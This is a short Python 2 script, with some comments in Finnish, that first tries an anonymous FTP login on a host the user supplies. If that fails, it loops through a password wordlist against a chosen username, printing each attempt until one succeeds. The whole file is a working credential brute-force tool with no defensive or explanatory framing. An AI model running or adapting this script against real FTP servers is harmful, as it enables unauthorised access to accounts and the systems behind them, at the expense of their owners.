#!/usr/bin/python

import ftplib
import sys

def connect(host,user,password):
	try:
		ftp = ftplib.FTP(host)
		ftp.login(user, password)
		ftp.quit()
		return True
	except:
		return False


def main():

	#Var
	ask = raw_input("Give address: ")
	targetHostAddress = ask
	ask = raw_input("Give User // 0 for list: ")
	userName = ask
	ask = raw_input("List to try:   (exp: testi.txt)")
	passwordsFilePath = ask

	#Start The program
	print 'Starting... '

	# Ilman tietoja
	print ('[+] Using anon creds: ')
	if connect(targetHostAddress, 'anonymous', 'test@test.com'):
		print('[*] FTP Ano log success')
	else:
		print('[*] FTP Ano log fail')

		#pass filun avaus
		passwordsFile = open(passwordsFilePath, 'r')

		for line in passwordsFile.readlines():
			password = line.strip('\r').strip('\n')
			print ('[*] Testing: ' + str(password))
			print ('[*] IP Target: ' + targetHostAddress)

			if connect(targetHostAddress, userName, password):
				#pass found
				print ('[*] FTP Brute success')
				exit(0)
			else:
				#Pass not found
				print ('[*] FTP Log Failed')



if __name__ == "__main__":
	main()


